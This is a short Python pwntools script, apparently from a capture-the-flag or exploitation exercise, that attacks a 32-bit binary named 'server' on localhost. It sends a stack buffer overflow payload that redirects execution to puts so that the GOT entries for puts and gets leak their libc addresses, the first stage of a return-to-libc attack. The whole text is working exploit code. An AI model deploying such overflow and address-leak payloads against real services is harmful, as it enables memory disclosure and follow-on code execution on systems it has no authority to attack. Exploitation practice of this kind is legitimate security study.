from pwn import *

target = process("./server")

elf = ELF('server')

target = remote("localhost", "12345")
# gdb.attach(target, gdbscript = 'b *0x08048628')

payload = b"S" * 0x3c
# 32 bit calling conventions are on the stack https://wiki.osdev.org/System_V_ABI
# Possible to rewrite this to reloop back to vuln and leak more addresses
payload += p32(elf.symbols["puts"])
payload += p32(elf.symbols["puts"])
payload += p32(elf.got["puts"])
payload += p32(elf.got["gets"])

target.sendline(payload)

print(target.recvuntil(b"Return address:"))
print(target.recvuntil(b"Return address:"))
print(target.recvline())
print(target.recvline())

leak_puts = u32(target.recv(4))
target.recvline()

leak_gets = u32(target.recv(4))

print(f"Puts addr: {hex(leak_puts)}")
print(f"Gets addr: {hex(leak_gets)}")